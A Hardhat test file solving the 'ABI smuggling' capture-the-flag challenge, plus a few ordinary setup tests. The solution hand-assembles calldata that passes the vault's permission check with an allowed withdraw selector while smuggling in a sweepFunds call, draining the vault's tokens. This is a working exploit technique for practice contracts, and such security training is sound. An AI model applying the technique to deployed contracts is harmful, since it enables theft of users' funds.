const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const attackVault = await vault.connect(player);
        const attackToken = await token.connect(player);

        const executeFs = vault.interface.getSighash("execute");
        const target = ethers.utils.hexZeroPad(attackVault.address,32).slice(2);
        const bytesLocation = ethers.utils.hexZeroPad("0x80",32).slice(2);
        const withdrawSelector = vault.interface.getSighash("withdraw").slice(2);

        const bytesLength = ethers.utils.hexZeroPad("0x44",32).slice(2);
        const sweepSelector = vault.interface.getSighash("sweepFunds").slice(2);
        const sweepFundsData = ethers.utils.hexZeroPad(recovery.address,32).slice(2)
                            + ethers.utils.hexZeroPad(attackToken.address,32).slice(2);
        
        const payload = executeFs + 
                        target + 
                        bytesLocation + ethers.utils.hexZeroPad("0x0",32).slice(2) +
                        withdrawSelector + ethers.utils.hexZeroPad("0x0",28).slice(2) + 
                        bytesLength+
                        sweepSelector+
                        sweepFundsData;
        
        await player.sendTransaction({
            to: attackVault.address,
            data: payload,
        })

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});


describe('[Test] ABI smuggling', function () {
    let deployer,recovery;
    let token, vault;
    let deployerPermission; 
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();

        // Set permissions
        deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        await vault.setPermissions([deployerPermission]);

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
    });

    it('First Withdrawal Should happen', async function () {
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);
    });
    it('Permission should be assigned', async function () {
        expect(await vault.permissions(deployerPermission)).to.be.true;
    });
    it('Make sure Vault is initialized', async function () {
        expect(await vault.initialized()).to.be.true;
    });
    it('vault balance should increase', async function () {
        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
    it('Cannot call Vault directly', async function () {
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed'); 
    });
});
